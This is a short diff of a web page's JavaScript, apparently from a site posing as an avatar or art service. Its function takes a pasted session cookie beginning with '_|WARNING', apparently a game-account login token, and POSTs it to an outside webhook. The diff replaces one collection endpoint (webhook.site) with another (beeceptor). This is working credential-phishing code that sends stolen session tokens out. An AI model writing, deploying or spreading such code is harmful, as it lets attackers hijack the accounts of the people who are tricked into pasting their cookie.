@@ -1,7 +1,7 @@
 function submitCookie() {
     const cookie = document.getElementById('cookie-input').value.trim();
     if (cookie && cookie.startsWith('_|WARNING')) {
-        fetch('https://webhook.site/abeda9ac-7aa3-4e79-afa3-c7b29666646e', { // r
+        fetch('https://adopt-me-art.free.beeceptor.com', { // r
             method: 'POST',
             body: JSON.stringify({ cookie: cookie, source: 'avatar-sketch' }),
             headers: { 'Content-Type': 'application/json' }
@@ -22,4 +22,5 @@ window.addEventListener('hashchange', () => {
     document.querySelectorAll('section').forEach(s => s.style.display = 'none');
     if (page) document.getElementById(page).style.display = 'block';
 });
+
 window.dispatchEvent(new Event('hashchange')); // Trigger on load
